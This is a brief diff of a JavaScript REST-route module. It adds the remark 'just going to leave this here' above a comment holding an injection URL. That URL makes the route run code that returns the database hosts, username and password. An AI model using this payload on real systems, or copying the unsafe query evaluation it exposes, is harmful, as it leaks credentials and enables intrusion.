@@ -47,6 +47,7 @@ module.exports = class CreateRestRoutes {
         return;
       }
 
+      // just going to leave this here
       // http://localhost:3000/json/auditoria/.find()&&function()%7Bconst%20d%20=%20global.db.base.connections[0];return%20JSON.stringify(d.hosts)+JSON.stringify(d.user)+JSON.stringify(d.pass)%7D()
       let result;
       console.log(query);
